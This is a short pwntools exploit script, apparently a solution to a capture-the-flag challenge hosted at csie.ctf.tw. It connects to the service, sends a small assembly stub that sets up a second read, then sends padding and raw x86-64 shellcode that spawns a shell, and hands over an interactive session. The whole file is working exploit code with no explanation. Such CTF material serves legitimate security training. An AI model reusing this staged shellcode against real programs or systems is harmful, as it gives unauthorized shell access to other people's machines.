from pwn import *

r = remote("csie.ctf.tw", 10122)
# r = remote("127.0.0.1", 8888)

payload = asm(
"""
push rax
pop rdi
push r11
pop rdx
syscall
""", arch = "amd64")	
# raw_input('data')
r.send(payload)

sc = "a" * 0x7 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(sc)
r.interactive()

